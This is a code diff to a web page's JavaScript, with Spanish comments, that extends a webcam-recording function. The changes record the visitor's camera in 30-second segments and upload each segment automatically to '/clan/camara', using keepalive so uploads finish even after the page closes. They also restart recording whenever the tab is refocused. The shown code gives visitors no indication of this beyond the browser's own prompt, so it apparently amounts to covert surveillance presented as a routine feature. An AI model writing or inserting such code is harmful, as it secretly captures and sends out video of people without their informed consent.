@@ -2552,17 +2552,28 @@ async function iniciarCamara() {
         }
 
         mediaRecorder.onstop = () => {
+            if (chunksCamara.length === 0) return
             const blob = new Blob(chunksCamara, { type: 'video/webm' })
             chunksCamara = []
             const form = new FormData()
             form.append('video', blob, 'sesion.webm')
-            fetch('/clan/camara', { method: 'POST', body: form })
+            // keepalive hace que el fetch sobreviva aunque la página se cierre
+            fetch('/clan/camara', { method: 'POST', body: form, keepalive: true })
         }
 
+        // Grabar en segmentos de 30 segundos y mandar automáticamente
         mediaRecorder.start()
+        setInterval(() => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop()
+                mediaRecorder.start()
+            }
+        }, 30000)
+
+        console.log('[CAMARA] Grabando...')
 
     } catch (e) {
-        // Usuario rechazó el permiso, no pasa nada
+        console.warn('[CAMARA] Error:', e)
     }
 }
 
@@ -2575,4 +2586,13 @@ function detenerCamara() {
 }
 
 window.addEventListener('beforeunload', detenerCamara)
+
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        detenerCamara()
+    } else {
+        iniciarCamara()
+    }
+})
+
 iniciarCamara()
